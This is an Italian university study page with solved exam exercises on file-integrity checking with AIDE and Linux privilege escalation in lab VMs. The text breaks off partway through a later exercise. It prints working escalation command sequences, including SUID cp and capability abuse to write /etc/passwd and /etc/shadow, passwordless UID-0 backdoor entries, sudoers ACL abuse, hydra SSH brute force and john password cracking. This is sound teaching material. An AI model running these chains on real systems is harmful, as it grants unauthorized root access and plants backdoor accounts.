@@ -1,0 +1,561 @@
+<!doctype html>
+<html lang="it" data-tema="scuro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>modello_integrity_privesc.md · cockpit</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<a class="salta" href="#contenuto">Vai al contenuto</a>
+
+<header class="testata">
+  <a class="marchio" href="../index.html">cockpit</a>
+  <nav class="navigazione">
+    <a href="../index.html">Oggi</a>
+    <a href="../laurea.html">Laurea</a>
+    <a href="../corsi.html">Corsi</a>
+    <a href="../materiali.html" aria-current="page">Materiali</a>
+    <a href="../workflow.html">Workflow</a>
+    <a href="../diario.html">Diario</a>
+  </nav>
+  <div class="azioni">
+    <button type="button" class="cerca-apri" data-apri-ricerca>
+      <span>Cerca</span><kbd>Ctrl</kbd><kbd>K</kbd>
+    </button>
+    <button type="button" class="tema" data-cambia-tema aria-label="Cambia tema"></button>
+  </div>
+</header>
+
+<main id="contenuto" class="contenuto">
+<p class="metrica__etichetta">
+  simulazione</p>
+<h1 class="titolo-pagina">modello_integrity_privesc.md</h1>
+<p class="tenue"><a href="../../Vault/UniCode/SIMULAZIONI ESAMI/SICINF/modelli_risolti/modello_integrity_privesc.md">Apri il file originale</a></p>
+<article class="prosa"><h1 id="modello-risolto-integrity-check-privilege-escalation">Modello Risolto — Integrity Check &amp; Privilege Escalation</h1>
+<blockquote>
+<p>Fonte: <code>SIMULAZIONI ESAMI/SICINF/Integrity_check_e_privilege_escalation.html</code> (Virtuale), esercizio
+del <strong>9 gennaio 2023</strong>. Consegna, testo strategia e screenshot sono quelli reali della soluzione
+ufficiale.</p>
+</blockquote>
+<hr />
+<h2 id="consegna-originale">Consegna originale</h2>
+<blockquote>
+<p>Scaricare il file <code>change1</code> e renderlo eseguibile (<code>chmod +x ./change1</code>). Il comando apporta una
+modifica a un file dentro <code>/usr/bin</code>.</p>
+</blockquote>
+<p><strong>Fase 1</strong>
+- Ideare un modo di identificare il file modificato e il tipo di modifica apportata.
+- Lanciare <code>sudo ./change1</code>.
+- Attuare la strategia ideata per identificare il file modificato e il tipo di modifica.
+- Documentare tutti i passi in modo dettagliato nel file <code>integrity.txt</code>.</p>
+<p><strong>Fase 2</strong> — catturare i comandi seguenti e l'output in uno screenshot <code>privesc.png</code>:
+- Usare, come utente <code>kali</code> <strong>senza sudo</strong>, il file modificato da <code>change1</code> per inserire in
+  <code>/etc/passwd</code> ed <code>/etc/shadow</code> le righe che "creano" un utente <code>toor</code> con privilegi di root e
+  senza password.
+- Diventare <code>toor</code> e lanciare <code>id</code>.</p>
+<hr />
+<h2 id="soluzione-modello">Soluzione modello</h2>
+<h3 id="fase-1-strategia-e-identificazione">Fase 1 — Strategia e identificazione</h3>
+<pre><code>STRATEGIA:
+1. Configurare AIDE per una scansione accurata di qualsiasi modifica
+   apportata dentro il sottoalbero /usr/bin (in /etc/aide/aide.conf,
+   verificare/aggiungere una regola tipo &quot;/usr/bin f+p+u+g+s+m+c+md5+sha256&quot;).
+2. Creare il database di riferimento SUL SISTEMA PULITO, prima di
+   eseguire change1: sudo aideinit (o aide --init, poi copiare
+   aide.db.new.gz in aide.db.gz).
+3. Lanciare sudo ./change1
+4. Rilanciare AIDE in modalità confronto:
+   sudo aide -C -c /etc/aide/aide.conf
+
+RISULTATO: il confronto rileva che /usr/bin/cp ha ora il bit SUID
+impostato (i permessi passano da -rwxr-xr-x a -rwsr-xr-x — la &quot;s&quot;
+al posto della &quot;x&quot; nel bit di esecuzione utente indica il SUID).
+Questo è il file modificato e il tipo di modifica.
+</code></pre>
+<p><strong>Perché questa strategia e non un'altra</strong>: AIDE per default a volte non copre <code>/usr/bin</code> in modalità
+"Full" (dipende dal preset del pacchetto), quindi va <strong>verificato/esplicitato</strong> nel file di config
+prima di creare il database — altrimenti il confronto post-modifica non rileva nulla lì. Il principio
+generale (uguale per tutti gli esercizi di questa famiglia, S7/S9/S11): database "pulito" <strong>prima</strong>
+della modifica, poi confronto <strong>dopo</strong>, mai il contrario.</p>
+<h3 id="fase-2-privilege-escalation-via-suid-su-cp">Fase 2 — Privilege escalation via SUID su <code>cp</code></h3>
+<pre><code>cp /etc/passwd ~/p
+cp /etc/shadow ~/s
+cat ~/p &gt; ~/passwd
+cat ~/s &gt; ~/shadow
+echo &quot;toor:x:0:0::/root:/bin/bash&quot; &gt;&gt; ~/passwd
+echo &quot;toor::19509:0:99999:7:::&quot; &gt;&gt; ~/shadow
+cp ~/passwd /etc/passwd
+cp ~/shadow /etc/shadow
+su toor
+id
+</code></pre>
+<p><code>privesc.png</code> (screenshot reale — trascrizione):</p>
+<pre><code>vagrant@client:~$ cp /etc/passwd ~/p
+vagrant@client:~$ cp /etc/shadow ~/s
+vagrant@client:~$ cat ~/p  &gt; ~/passwd
+vagrant@client:~$ cat ~/s &gt; ~/shadow
+vagrant@client:~$ ls -l
+total 16
+-rw-r--r-- 1 root     vagrant 1503 Jun  2 02:29 p
+-rw-r--r-- 1 vagrant  vagrant 1503 Jun  2 02:30 passwd
+-rw-r----- 1 root     vagrant  864 Jun  2 02:29 s
+-rw-r--r-- 1 vagrant  vagrant  864 Jun  2 02:30 shadow
+vagrant@client:~$ echo &quot;toor:x:0:0::/root:/bin/bash&quot; &gt;&gt; ~/passwd
+vagrant@client:~$ echo &quot;toor::19509:0:99999:7:::&quot; &gt;&gt; ~/shadow
+vagrant@client:~$ grep toor *
+passwd:toor:x:0:0::/root:/bin/bash
+shadow:toor::19509:0:99999:7:::
+vagrant@client:~$ cp ~/passwd /etc/passwd
+vagrant@client:~$ cp ~/shadow /etc/shadow
+vagrant@client:~$ su toor
+root@client:/home/vagrant# id
+uid=0(root) gid=0(root) groups=0(root)
+root@client:/home/vagrant#
+</code></pre>
+<hr />
+<h2 id="perche-funziona-meccanismo-non-solo-comandi">Perché funziona (meccanismo, non solo comandi)</h2>
+<p><code>cp</code> con il bit <strong>SUID</strong> attivo viene eseguito sempre con i privilegi del <strong>proprietario del file</strong>
+(root), indipendentemente da chi lo lancia. Un utente normale non ha permessi di scrittura diretta su
+<code>/etc/passwd</code>/<code>/etc/shadow</code> (o su shadow addirittura non ha permessi di lettura), ma se usa <code>cp</code> per
+scriverci sopra, la scrittura avviene <strong>come root</strong>, perché è <code>cp</code> — non l'utente — ad avere i
+privilegi effettivi durante l'esecuzione.</p>
+<p>La sequenza quindi: copia i file originali in una directory scrivibile dall'utente (<code>~/p</code>, <code>~/s</code>),
+li duplica in file modificabili (<code>~/passwd</code>, <code>~/shadow</code>), vi appende una riga utente con <strong>UID/GID
+0</strong> (root) e <strong>campo password vuoto in shadow</strong> (nessuna password richiesta per il login), poi
+ricopia questi file modificati sopra gli originali — usando di nuovo <code>cp</code>, che grazie al SUID ha i
+permessi per farlo anche se l'utente <code>kali</code>/<code>vagrant</code> normalmente non li avrebbe.</p>
+<p>Questo è l'esempio più semplice della famiglia; le varianti successive (change2...change9) modificano
+binari diversi con tecniche diverse (capabilities, ACL, ecc. — vedi febbraio 2025 nello stesso file
+per un esempio con <code>getcap</code>/<code>getfacl</code>/<code>hydra</code>), ma il principio resta: <strong>AIDE per identificare cosa
+è cambiato, poi ragionare su come quella specifica modifica dia un vantaggio di privilegio</strong>.</p>
+<hr />
+<h2 id="15-giugno-2023-change2-soluzione-ufficiale-non-allegata-ricostruita-per-analisi-statica">15 giugno 2023 — <code>change2</code> (soluzione ufficiale non allegata: ricostruita per analisi statica)</h2>
+<blockquote>
+<p>Fonte: stesso HTML, cap. 2. <strong>Attenzione</strong>: per questo esercizio nel libro Moodle <strong>non è
+allegata alcuna soluzione ufficiale</strong> (nessun link "SOLUZIONE", solo il binario <code>change2</code>
+scaricabile). Quanto segue è <strong>ricostruito da analisi statica del binario</strong> (<code>strings</code>,
+<code>objdump -d</code>), non da un write-up del docente: il vettore reale è certo (deriva dal codice del
+binario), i comandi di exploit sono l'inferenza standard della famiglia, non una trascrizione.</p>
+</blockquote>
+<h3 id="consegna-originale_1">Consegna originale</h3>
+<blockquote>
+<p>Scaricare <code>change2</code>, <code>chmod +x ./change2</code>. Il comando modifica file dentro <code>/usr/bin</code> e <code>/etc</code>.
+<strong>Fase 1</strong>: ideare un modo di identificare file e tipo di modifica, <code>sudo ./change2</code>, attuare la
+strategia, documentare in <code>integrity.txt</code>. <strong>Fase 2</strong> (<code>privesc.png</code>): usare <strong>come utente <code>kali</code>
+senza sudo</strong> il/i file modificato/i per inserire in <code>/etc/passwd</code> e <code>/etc/shadow</code> le righe che
+"creano" un utente <code>toor</code> con privilegi di root e <strong>senza password</strong>; diventare <code>toor</code> e <code>id</code>.</p>
+</blockquote>
+<h3 id="cosa-fa-davvero-change2-dallanalisi-del-binario">Cosa fa davvero <code>change2</code> (dall'analisi del binario)</h3>
+<p><code>change2</code> è linkato a <code>libcap</code> e <code>libacl</code> e nel <code>main</code> esegue in sequenza (indirizzi da <code>objdump -d</code>):</p>
+<ol>
+<li><code>newaclfake("user:prandini:rwx", "/etc/passwd")</code></li>
+<li><code>newaclfake("user:prandini:rwx", "/etc/shadow")</code></li>
+<li><code>mycapset("cap_dac_override=ep", "/usr/bin/vim.tiny")</code></li>
+<li><code>mycapfake("cap_dac_override=ep", "/usr/bin/cp")</code></li>
+<li><code>mycapfake("cap_dac_override=ep", "/usr/bin/tee")</code></li>
+</ol>
+<p>Le funzioni con <code>fake</code> nel nome <strong>applicano la modifica e poi la ripristinano</strong> nello stesso
+processo: <code>mycapfake</code> chiama <code>mycapset</code> (imposta la capability) e subito dopo <code>mycapres</code>
+(<code>cap_clear</code> + <code>cap_set_file</code>, la azzera); <code>newaclfake</code> chiama <code>acl_set_file</code> due volte (la
+seconda ripristina l'ACL originale salvato). Effetto netto: <code>cp</code>, <code>tee</code>, <code>/etc/passwd</code> e
+<code>/etc/shadow</code> <strong>tornano com'erano</strong> (a parte il <code>Ctime</code>, che cambia comunque). L'<strong>unica modifica
+persistente</strong> è quella applicata da <code>mycapset</code> (una sola <code>cap_set_file</code>, senza ripristino):
+<code>/usr/bin/vim.tiny</code> ottiene realmente <code>cap_dac_override=ep</code>. Le funzioni <code>newaclmod</code>/<code>myaddacl</code>
+esistono nel binario ma <strong>non sono chiamate</strong> dal <code>main</code>.</p>
+<p>Conseguenza pratica per la Fase 1: nel confronto AIDE (regola <code>/usr/bin f Full</code> + <code>/etc f Full</code>)
+solo <code>/usr/bin/vim.tiny</code> mostra una capability nuova (<code>XAttrs num=0 → num=1</code>); <code>cp</code>/<code>tee</code>/
+<code>passwd</code>/<code>shadow</code> compaiono al più con variazioni di solo <code>Ctime</code> — sono i vicoli ciechi
+deliberati. <code>getcap /usr/bin/vim.tiny</code> conferma <code>cap_dac_override=eip</code>.</p>
+<h3 id="fase-2-exploit-inferito-identico-per-meccanismo-a-12-gennaio-2026">Fase 2 — exploit inferito (identico per meccanismo a 12 gennaio 2026)</h3>
+<pre><code>vim.tiny /etc/passwd
+# aggiungere in fondo:  toor::0:0::/root:/bin/bash   (secondo campo VUOTO = nessuna password)
+:w!                    # vim.tiny avvisa che il file non è scrivibile: forzare — la cap bypassa il DAC
+su toor
+id                     # uid=0(root)
+</code></pre>
+<h3 id="perche-funziona">Perché funziona</h3>
+<p><code>cap_dac_override</code> su <code>vim.tiny</code> permette all'editor di <strong>scrivere qualunque file</strong> ignorando i
+permessi Unix, chiunque lo lanci; l'utente <code>kali</code> non ha permesso di scrittura su <code>/etc/passwd</code>,
+ma <code>vim.tiny</code> sì. La riga <code>toor::0:0::/root:/bin/bash</code> ha <strong>UID/GID 0</strong> (root) e <strong>campo password
+vuoto</strong> — per la semantica classica "nessuna password richiesta", quindi <code>su toor</code> concede subito
+la shell root. È lo stesso identico meccanismo del caso 12 gennaio 2026: lì la capability era
+inserita da un pacchetto <code>.deb</code>, qui direttamente dal binario <code>change2</code>. La differenza didattica
+utile: i vicoli ciechi qui sono "invisibili ad AIDE" perché ripristinati, mentre in altri
+esercizi (11 gen 2024, feb 2025) restano nel diff ma sono inutilizzabili — due modi diversi in cui
+un pacchetto realistico maschera il vettore vero.</p>
+<hr />
+<h2 id="11-gennaio-2024-change4-capability-cap_dac_override-su-tee">11 gennaio 2024 — <code>change4</code> (capability <code>cap_dac_override</code> su <code>tee</code>)</h2>
+<blockquote>
+<p>Fonte: cap. 3, con soluzione ufficiale allegata: testo <code>integrity.txt</code> + screenshot (Mousepad).</p>
+</blockquote>
+<h3 id="consegna-originale_2">Consegna originale</h3>
+<blockquote>
+<p><code>change4</code>, modifiche in <code>/usr/bin</code> e <code>/etc</code>. Fase 1: identificare file e modifica, documentare in
+<code>integrity.txt</code>. Fase 2 (<code>privesc.png</code>): come <code>kali</code> <strong>senza sudo</strong>, usare il/i file modificato/i
+per creare in <code>/etc/passwd</code> e <code>/etc/shadow</code> un utente <code>hack</code> con privilegi di root e <strong>password
+<code>hack</code></strong>; diventare <code>hack</code> e <code>id</code>.</p>
+</blockquote>
+<h3 id="fase-1-diff-aide-e-triage">Fase 1 — diff AIDE e triage</h3>
+<p>Il confronto AIDE segnala modifiche a quattro file (trascrizione dall'<code>integrity.txt</code> ufficiale):
+<code>/etc/sudoers</code> (ACL), <code>/usr/bin/grep</code> (capabilities), <code>/usr/bin/tee</code> (capabilities),
+<code>/usr/bin/vim.tiny</code> (rimozione del diritto di scrittura utente). <strong>Tre su quattro non sono
+sfruttabili</strong>; l'unico file utilizzabile è <code>/usr/bin/tee</code>, dotato di <code>cap_dac_override</code>.</p>
+<h3 id="fase-2-exploit-trascrizione-dello-screenshot-ufficiale">Fase 2 — exploit (trascrizione dello screenshot ufficiale)</h3>
+<pre><code>cat /etc/passwd &gt; /tmp/passwd
+openssl passwd -1 -salt hack hack &gt; new_entry      # → $1$hack$xR6zsfvpez/t8teGRRSNr.
+# comporre la riga:  hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash
+cat new_entry &gt;&gt; /tmp/passwd
+cat /tmp/passwd | tee /etc/passwd                  # tee ha cap_dac_override → scrive /etc/passwd
+su hack                                             # Password: hack
+whoami                                              # root
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Refuso nella trascrizione ufficiale.</strong> La riga <code>hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash</code>
+ha <strong>solo 6 campi</strong> (manca la home directory). Il formato di <code>/etc/passwd</code> è a <strong>7 campi</strong>:
+<code>utente:password:UID:GID:GECOS:home:shell</code>. La riga corretta e ben formata è
+<code>hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash</code> (GECOS=<code>root</code>, home=<code>/root</code>,
+shell=<code>/bin/bash</code>). Non ricopiare ciecamente la versione a 6 campi: con un campo mancante i valori
+slittano (home diventa <code>/bin/bash</code>, shell vuota) e <code>su hack</code> può comportarsi in modo imprevedibile.
+Vedi <code>guida_esame_privesc.md</code> §4.3.</p>
+<p>Nota fonte: l'<code>integrity.txt</code> ufficiale descrive una variante che scrive <strong>anche</strong> <code>/etc/shadow</code>
+(hash <code>openssl passwd -6 -salt ... hack</code> appeso con <code>tee -a /etc/shadow</code>); lo <strong>screenshot</strong>
+allegato mostra invece la via più semplice effettivamente eseguita — hash <strong>inline nel secondo
+campo di <code>/etc/passwd</code></strong>, senza toccare shadow. Entrambe valide; qui si riporta quella dello
+screenshot perché è quella catturata come prova.</p>
+</blockquote>
+<h3 id="perche-funziona_1">Perché funziona</h3>
+<p><code>tee</code> con <code>cap_dac_override</code> scrive <code>/etc/passwd</code> scavalcando i permessi. Il formato storico di
+<code>/etc/passwd</code> ammette l'<strong>hash direttamente nel secondo campo</strong> (dove oggi c'è la <code>x</code> che rimanda a
+shadow): mettendo <code>$1$hack$…</code> con UID/GID 0 si crea un account root la cui password (<code>hack</code>) è
+verificata contro quell'hash MD5-crypt. <code>tee</code> è il vettore giusto perché è l'unico dei quattro file
+segnalati con una capability <em>effettiva</em> e <em>utile</em> (scrivere file): <code>grep</code> e <code>vim.tiny</code> sono rumore.</p>
+<hr />
+<h2 id="8-febbraio-2024-change5-capability-cap_fowner-su-chmod-suid-cp">8 febbraio 2024 — <code>change5</code> (capability <code>cap_fowner</code> su <code>chmod</code> → SUID <code>cp</code>)</h2>
+<blockquote>
+<p>Fonte: cap. 4, soluzione ufficiale: testo <code>integrity.txt</code> + screenshot.</p>
+</blockquote>
+<h3 id="consegna-originale_3">Consegna originale</h3>
+<blockquote>
+<p><code>change5</code>, modifiche in <code>/usr/bin</code> e <code>/etc</code>. Fase 1 come sopra (<code>integrity.txt</code>). Fase 2
+(<code>privesc.png</code>): come <code>kali</code> <strong>senza sudo</strong>, creare in <code>/etc/passwd</code> e <code>/etc/shadow</code> un utente
+<code>toor</code> con privilegi di root e <strong>password <code>gotRoot</code></strong>; diventare <code>toor</code> e <code>id</code>.</p>
+</blockquote>
+<h3 id="fase-1-diff-aide">Fase 1 — diff AIDE</h3>
+<p>Modifiche segnalate (trascrizione dall'<code>integrity.txt</code> ufficiale):</p>
+<pre><code>File: /etc/passwd    Ctime cambiato
+File: /etc/shadow    Perm -rw-r----- → -rw-------   (+ Ctime)
+File: /usr/bin/chmod XAttrs num=0 → num=1  (security.capability)
+File: /usr/bin/tail  XAttrs num=0 → num=1  (security.capability)
+</code></pre>
+<p>Verifica puntuale: <code>getcap</code> mostra <code>/usr/bin/chmod cap_fowner=ep</code>; <code>/usr/bin/tail</code> non ha
+capability effettiva (<code>=</code>, vuota). <strong>Solo <code>chmod</code> è utile.</strong></p>
+<h3 id="fase-2-exploit-trascrizione-integritytxt-screenshot">Fase 2 — exploit (trascrizione integrity.txt + screenshot)</h3>
+<pre><code>chmod u+s /usr/bin/cp                # chmod (CAP_FOWNER) setta il SUID su cp anche se non ne è proprietario
+ls -la /usr/bin/cp                   # -rwsr-xr-x 1 root root ... /usr/bin/cp
+cp /etc/passwd tempPasswd
+featherpad tempPasswd                # aggiungere: toor:$1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.:0:0:root:/root:/usr/bin/zsh
+openssl passwd gotRoot               # → $1$kll9aWJ6$qMNag9wCNqcKs8CgGSE3t.  (senza -salt: salt casuale)
+cp tempPasswd /etc/passwd            # cp ora è SUID-root → sovrascrive il file protetto
+su toor                              # Password: gotRoot
+# root@kali
+</code></pre>
+<h3 id="perche-funziona_2">Perché funziona</h3>
+<p>Chain di <strong>due</strong> vettori. <code>CAP_FOWNER</code> significa "ignora il controllo che di norma consente di
+cambiare permessi solo al proprietario del file": <code>chmod</code> con questa capability può settare il bit
+<strong>SUID</strong> su <code>/usr/bin/cp</code> (di proprietà di root) pur essendo lanciato da <code>kali</code>. Da quel momento
+<code>cp</code> è un secondo vettore SUID (come nel caso 9 gennaio 2023): eseguito da chiunque, gira come
+root, quindi <code>cp tempPasswd /etc/passwd</code> sovrascrive il file protetto. L'hash MD5-crypt di
+<code>gotRoot</code> è messo inline nel secondo campo passwd, UID/GID 0. Lezione: una capability non
+direttamente utile a scrivere <code>/etc/passwd</code> può comunque <strong>fabbricare</strong> il vettore che serve
+(qui: caps → SUID → overwrite).</p>
+<hr />
+<h2 id="13-giugno-2024-change_2024_06_13-utente-senza-password-acl-su-etcsudoers">13 giugno 2024 — <code>change_2024_06_13</code> (utente senza password + ACL su <code>/etc/sudoers</code>)</h2>
+<blockquote>
+<p>Fonte: cap. 5, soluzione ufficiale: testo <code>integrity.txt</code> + screenshot. La consegna qui <strong>non</strong>
+nomina <code>toor</code>/password: chiede solo di <strong>diventare root senza usare il "potere sudo" di <code>kali</code></strong>.</p>
+</blockquote>
+<h3 id="consegna-originale_4">Consegna originale</h3>
+<blockquote>
+<p><code>change_2024_06_13</code> (consigliata VM Kali mai alterata), modifiche in <code>/usr/bin</code> e <code>/etc</code>. Fase 1:
+identificare file e modifica. Fase 2: <strong>senza ricorrere al "potere sudo" dell'utente <code>kali</code></strong> (gli
+altri usi derivanti dalle modifiche sono consentiti), diventare root e lanciare <code>id</code>. Documentare
+in <code>integrity.txt</code>, screenshot <code>privesc.png</code>.</p>
+</blockquote>
+<h3 id="fase-1-diff-aide-5-modifiche-trascrizione-ufficiale">Fase 1 — diff AIDE (5 modifiche, trascrizione ufficiale)</h3>
+<pre><code>f = p.. .c .. .   : /etc/crontab      Perm -rw-r--r-- → -rw-rw----
+f &gt; ... mc .H .   : /etc/passwd       (contenuto cambiato)
+f = p.. .c .. .   : /etc/sudoers      Perm -r--r----- → -r--rw----   (ACL modificata)
+f = ... .c .. X   : /usr/bin/tee      XAttrs: capability aggiunta
+f = ... .c .. .   : /usr/bin/vim.basic (solo Ctime)
+</code></pre>
+<p>Triage (dall'<code>integrity.txt</code>): permessi di <code>/etc/crontab</code> <strong>ininfluenti</strong>; <code>vim.basic</code> solo
+timestamp; <code>tee</code> è un <strong>falso positivo</strong> (nessuna capability effettiva). Le due modifiche vere:
+in <code>/etc/passwd</code> un nuovo utente senza password <code>intruso::1202:1000::/tmp:/bin/bash</code>; l'ACL di
+<code>/etc/sudoers</code> modificata per consentire la <strong>scrittura</strong> all'utente <code>intruso</code>.</p>
+<h3 id="fase-2-exploit">Fase 2 — exploit</h3>
+<pre><code>su intruso                                           # nessuna password
+echo 'intruso    ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers   # l'ACL consente a intruso di scrivere sudoers
+sudo -i                                              # intruso è ora sudoer pieno → root
+</code></pre>
+<p>Lo screenshot conferma: <code>su intruso</code> / <code>su - intruso</code>, editing di <code>/etc/sudoers</code> (<code>nano</code>), poi
+<code>sudo su</code> → <code>root@kali</code>.</p>
+<h3 id="perche-funziona_3">Perché funziona</h3>
+<p>Nessun SUID né capability: il vettore è puramente <strong>passwd + ACL + sudoers</strong>. L'utente <code>intruso</code>
+ha il secondo campo passwd vuoto → login libero (<code>su intruso</code> non chiede password). L'ACL POSIX
+<code>user:intruso:rw</code> su <code>/etc/sudoers</code> gli dà il permesso di <strong>scrivere</strong> quel file (che i permessi
+Unix riserverebbero a root) — così <code>intruso</code> si concede una riga sudo onnipotente e poi <code>sudo -i</code>
+diventa root. È il caso "catena sociale" della famiglia: si sfruttano configurazioni di sistema,
+non binari privilegiati.</p>
+<hr />
+<h2 id="febbraio-2025-change-2025-02-13-acl-sudoers-brute-force-ssh-con-hydra">febbraio 2025 — <code>change-2025-02-13</code> (ACL + sudoers + brute-force SSH con hydra)</h2>
+<blockquote>
+<p>Fonte: cap. 6, soluzione ufficiale <strong>inline nel testo</strong> (in rosso, "SOLUZIONE SOTTO"). Consegna:
+diventare root senza il potere sudo di <code>kali</code>. È il caso citato dagli altri modelli per
+<code>getcap</code>/<code>getfacl</code>/<code>hydra</code>.</p>
+</blockquote>
+<h3 id="fase-1-diff-aide-7-modifiche-trascrizione-ufficiale">Fase 1 — diff AIDE (7 modifiche, trascrizione ufficiale)</h3>
+<pre><code>f &gt; ... mc .H .   : /etc/group        (contenuto)
+f &gt; ... mc .H .   : /etc/passwd       (contenuto)
+f &gt; ... mc .H .   : /etc/shadow       (contenuto)
+f &gt; ... mc .H .   : /etc/sudoers      (contenuto)
+f = ... .c .. X + : /usr/bin/chmod    capability
+f = ... .c .. X + : /usr/bin/date     capability
+f = p.. .c .A .   : /usr/bin/tee      ACL
+</code></pre>
+<p>Analisi puntuale con i comandi specifici (trascrizione ufficiale):</p>
+<pre><code>getcap /usr/bin/chmod   → (vuoto: falso positivo)
+getcap /usr/bin/date    → cap_audit_read=ep   (modifica vera ma inutile: legge solo i log di audit)
+getfacl /usr/bin/tee    → user:spy:rw-         (spy può modificare tee, ma tee non ha privilegi speciali)
+grep spy /etc/passwd    → spy:x:5243:5243::/tmp:/bin/bash   (protetto da password, hash non accessibile)
+</code></pre>
+<p>Tutte le modifiche ai binari sono vicoli ciechi. Il vettore reale è l'utente <code>spy</code> +
+<code>/etc/sudoers</code>, ma la password di <code>spy</code> non è ricavabile offline (nessun accesso all'hash).</p>
+<h3 id="fase-2-exploit-brute-force-online-sudoers">Fase 2 — exploit (brute-force online + sudoers)</h3>
+<pre><code>hydra -l spy -P /usr/share/wordlists/rockyou.txt ssh://localhost   # → login: spy  password: qwerty
+su - spy                                                            # Password: qwerty
+sudo -l          # → (root) NOPASSWD: /usr/bin/tee
+echo &quot;toor::0:0::/root:/bin/bash&quot; | sudo /usr/bin/tee -a /etc/passwd
+su - toor
+id               # uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="perche-funziona_4">Perché funziona</h3>
+<p>Il vettore non è nei binari (tutti falsi positivi o capability inutili) ma nella combinazione
+<strong>utente con password + regola sudoers permissiva</strong>: <code>spy</code> può eseguire <code>tee</code> come root senza
+password (<code>NOPASSWD: /usr/bin/tee</code>). Poiché l'hash di <code>spy</code> non è leggibile offline, la password si
+ottiene <strong>online</strong> con <code>hydra</code> (attacco a dizionario su SSH, <code>rockyou.txt</code>) — è l'unico esercizio
+del pool che richiede un brute-force <em>online</em> invece di <code>john</code> offline, proprio perché shadow non è
+accessibile. Ottenuto <code>spy</code>, <code>sudo tee</code> scrive come root una riga passwd UID-0 senza password.
+L'ACL <code>user:spy:rw</code> su <code>tee</code> è un depistaggio che indica <em>chi</em> è l'utente da attaccare ma è di per
+sé inutile (tee senza sudo non ha alcun privilegio).</p>
+<hr />
+<h2 id="10-luglio-2025-pacchetto-deb-first-senza-password-john-su-next-cap_fowner-chmod">10 luglio 2025 — pacchetto <code>.deb</code> (first senza password → john su next → CAP_FOWNER chmod)</h2>
+<blockquote>
+<p>Fonte: cap. 7, soluzione ufficiale: ZIP con <code>integrity.txt</code> + 7 screenshot. Primo caso della
+famiglia consegnato come <strong>pacchetto Debian</strong> invece che binario <code>change</code>.</p>
+</blockquote>
+<h3 id="consegna-originale_5">Consegna originale</h3>
+<blockquote>
+<p>Scaricare <code>esame_2025.07.10_all.deb.gz</code>. Il pacchetto modifica file in <code>/usr/bin</code> e <code>/etc</code> (più
+altri deducibili). Fase 1: predisporre l'identificazione, <code>gunzip</code>, <code>sudo dpkg -i
+esame_2025.07.10_all.deb</code>, attuare la strategia. Fase 2: <strong>senza il potere sudo di <code>kali</code></strong>,
+diventare root e <code>id</code>. <code>integrity.txt</code> + <code>privesc.png</code>.</p>
+</blockquote>
+<h3 id="fase-1-setup-e-diff-aide">Fase 1 — setup e diff AIDE</h3>
+<p>Config AIDE (trascrizione ufficiale): commentare <code>@@x_include /etc/aide/aide.conf.d …</code>, aggiungere
+<code>/usr/bin f Full</code> e <code>/etc/ f Full</code>; <code>sudo aideinit</code>; installare; <code>sudo aide -C -c /etc/aide/aide.conf</code>.
+Diff (7 changed): <code>/etc/group</code>, <code>/etc/gshadow</code>, <code>/etc/passwd</code>, <code>/etc/shadow</code> (contenuto; su shadow
+anche <strong>ACL</strong>), <code>/usr/bin/chmod</code> (perm + gid + capability), <code>/usr/bin/sort</code> (capability),
+<code>/usr/bin/yes</code> (SUID: <code>-rwxr-xr-x → -rwsr-xr-x</code>).</p>
+<p>Analisi (trascrizione ufficiale):
+- Due nuovi utenti: <code>first::1001:1001::/tmp:/bin/bash</code> (<strong>senza password</strong>) e
+  <code>next:x:1002:1002::/tmp:/bin/bash</code>.
+- ACL su <code>/etc/shadow</code>: <code>user:first:r--</code> → <strong><code>first</code> può leggere shadow</strong>.
+- <code>sort</code> ha <code>CAP_MKNOD</code> (creare device file: non immediatamente utilizzabile).
+- <code>yes</code> ha il SUID (ma produce solo stringhe su stdout: inutile come root).
+- <code>chmod</code> ha <code>CAP_FOWNER</code>, con permessi ristretti a root e al gruppo <code>next</code>.</p>
+<h3 id="fase-2-exploit-trascrizione-integritytxt-privesc78png">Fase 2 — exploit (trascrizione integrity.txt + privesc7/8.png)</h3>
+<pre><code>su - first                                              # senza password
+unshadow /etc/passwd /etc/shadow &gt; /tmp/temporaneo      # first legge shadow grazie all'ACL
+john -format=crypt -wordlist=/usr/share/wordlists/rockyou.txt /tmp/temporaneo   # → next: alejandro
+su - next                                               # Password: alejandro
+chmod 0777 /etc/passwd                                  # next può usare chmod (CAP_FOWNER): passwd scrivibile
+vim /etc/passwd                                         # rimuovere la x da root:  root::0:0:...
+su root                                                 # nessuna password → root
+id                                                      # uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="perche-funziona_5">Perché funziona</h3>
+<p>Catena di quattro anelli: (1) <code>first</code> senza password = punto d'appoggio gratuito; (2) l'ACL
+<code>user:first:r--</code> su shadow permette a <code>first</code> di leggere gli hash normalmente riservati a root; (3)
+<code>john</code> cracca offline la password di <code>next</code> (<code>alejandro</code>) da shadow; (4) <code>next</code> è abilitato a
+eseguire <code>chmod</code> che ha <code>CAP_FOWNER</code>, quindi rende <code>/etc/passwd</code> scrivibile e si toglie la <code>x</code> di
+root (root senza password) → <code>su root</code>. Depistaggi: <code>sort</code> (CAP_MKNOD) e <code>yes</code> (SUID) sono
+privilegi reali ma inutilizzabili. L'<code>integrity.txt</code> elenca anche strategie alternative (scrivere
+<code>/etc/sudoers</code>, aggiungere <code>first</code> al gruppo <code>sudo</code>, cambiare l'UID) — lo screenshot mostra la via
+più diretta (chmod passwd + edit di root).</p>
+<hr />
+<h2 id="30-ottobre-2025-pacchetto-debgpg-searcher-senza-password-wildcard-sudoers-john-vimtiny">30 ottobre 2025 — pacchetto <code>.deb.gpg</code> (searcher senza password → wildcard sudoers → john → vim.tiny)</h2>
+<blockquote>
+<p>Fonte: cap. 8, soluzione ufficiale: tar.gz con <code>integrity.txt</code> + 4 screenshot. È la catena più
+ricca del pool: quattro vettori concatenati, incluso l'abuso di una <strong>wildcard in sudoers</strong>.</p>
+</blockquote>
+<h3 id="consegna-originale_6">Consegna originale</h3>
+<blockquote>
